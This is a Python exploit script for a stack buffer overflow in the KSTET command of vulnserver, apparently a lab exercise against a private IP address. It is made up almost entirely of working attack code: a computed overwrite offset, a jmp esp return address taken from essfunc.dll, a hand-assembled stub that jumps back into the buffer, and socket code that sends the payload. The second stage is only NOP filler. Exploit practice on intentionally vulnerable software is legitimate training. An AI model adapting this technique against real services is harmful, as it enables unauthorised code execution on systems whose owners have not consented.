#!/usr/bin/env python

from socket import socket, AF_INET, SOCK_STREAM
from struct import pack
from sys import exit

verbose = False
rhost = "172.16.153.130"
rport = 9999
target = (rhost, rport)

first_stage = (
    "\x54"  # PUSH ESP
    "\x5A"  # POP EDX
    # note how nasm_shell.rb wants this when building the command
    # nasm > SUB EDX,70
    # 00000000  83EA46            sub edx,byte +0x46
    "\x83\xEA\x46"  # SUB EDX, 46 (46 hex == 70 decimal)
    "\xFF\xE2"  # JMP EDX
)
first_stage += "\x90" * (30 - len(first_stage))
second_stage = "\x90" * 66

# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5000
# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 5000 -q 41326341
# [*] Exact match at offset 66
buff = second_stage
# Message=  0x62501203 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (\\vmware-host\Shared Folders\SharedWithVM\vulnerable-apps\vulnserver\essfunc.dll)
buff += pack("<L", 0x62501203)
buff += first_stage
buff += "C" * (5000 - len(buff))

if __name__ == '__main__':
    print('[+] creating payload')
    payload = "KSTET /.:/{buff}\r\n".format(buff=buff)
    if verbose:
        print('[*] payload:\n\t{payload}'.format(payload=payload))
    print('[+] connecting to target')
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(target)
    print('[+] checking for welcome message')
    msg = s.recv(1024)
    print('[+] received welcome message')
    if verbose:
        print('[*] welcome message: {msg}'.format(msg=msg))
    print('[+] sending payload')
    s.send(payload)
    print('[+] payload sent, cleaning up')
    s.close()

